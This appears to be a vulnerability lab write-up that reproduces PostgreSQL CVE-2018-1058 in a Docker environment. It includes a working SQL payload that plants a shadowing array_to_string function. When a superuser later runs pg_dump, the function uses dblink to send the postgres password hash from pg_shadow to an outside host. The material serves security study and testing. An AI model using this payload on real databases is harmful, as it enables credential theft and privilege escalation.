# PostgreSQL Privilege Escalation Vulnerability (CVE-2018-1058)

PostgreSQL is a relational database. There is a logic error in its versions 9.3 to 10, which causes the superuser to trigger malicious code created by ordinary users without knowing it, resulting in some unexpected operations.

Reference link:

- https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
- https://xianzhi.aliyun.com/forum/topic/2109

## Vulnerable environment

Start the vulnerable environment:

```
docker compose up -d
```

After the environment is started, the default 5432 port of PG will be opened locally.

## Vulnerability Reproduction

Refer to the second exploitation method in the above link, we first log in to postgres as a normal user `vulhub:vulhub`: `psql --host your-ip --username vulhub`

![](1.png)

Execute the following statement and exit:

```
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

Then I listened to port 5433 on `10.0.0.1`, waiting for the super user to trigger the "backdoor" we left.

(Pretend to be a super user) On the target machine, execute the `pg_dump` command as a super user: `docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub` to export the contents of the vulhub database.

While executing the above command, the "backdoor" has been triggered, and the `10.0.0.1` machine has received sensitive information:

![](2.png)

The above process is only one way to exploit the vulnerability. It may be a bit messy because it involves many machines. Readers are advised to read the article in the reference link to obtain more exploitation methods.
